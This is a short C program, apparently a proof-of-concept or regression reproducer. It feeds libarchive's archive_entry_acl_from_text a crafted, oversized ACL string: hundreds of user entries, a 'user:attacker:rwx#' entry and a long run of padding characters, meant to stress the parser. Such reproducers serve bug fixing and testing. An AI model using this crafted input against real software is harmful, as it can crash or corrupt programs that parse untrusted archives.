#include <archive.h>
#include <archive_entry.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void) {
    struct archive_entry *entry;
    char *acl_text;
    size_t text_len;
    int i;
    
    entry = archive_entry_new();
    if (!entry) {
        return 1;
    }
    
    text_len = 65536;
    acl_text = (char *)malloc(text_len);
    if (!acl_text) {
        archive_entry_free(entry);
        return 1;
    }
    
    memset(acl_text, ' ', text_len - 1);
    acl_text[text_len - 1] = '\0';
    
    strcpy(acl_text, "user::rwx\ngroup::r-x\nother::r--\n");
    size_t offset = strlen(acl_text);
    
    for (i = 0; i < 500; i++) {
        if (offset + 100 < text_len - 2) {
            int written = snprintf(acl_text + offset, text_len - offset, 
                                   "user:user%d:rwx\n", i);
            if (written > 0) {
                offset += written;
            }
        }
    }
    
    if (offset + 50 < text_len - 1) {
        strcpy(acl_text + offset, "user:attacker:rwx#");
        offset += strlen("user:attacker:rwx#");
    }
    
    for (i = 0; i < 10000 && offset < text_len - 1; i++) {
        acl_text[offset++] = 'X';
    }
    acl_text[offset] = '\0';
    
    int ret = archive_entry_acl_from_text(entry, acl_text, ARCHIVE_ENTRY_ACL_TYPE_ACCESS);
    
    if (ret != ARCHIVE_OK) {
        fprintf(stderr, "ACL parsing returned error: %d\n", ret);
    }
    
    const char *text_out = archive_entry_acl_to_text(entry, NULL, ARCHIVE_ENTRY_ACL_TYPE_ACCESS);
    if (text_out) {
        fprintf(stderr, "ACL text length: %zu\n", strlen(text_out));
    }
    
    free(acl_text);
    archive_entry_free(entry);
    
    return 0;
}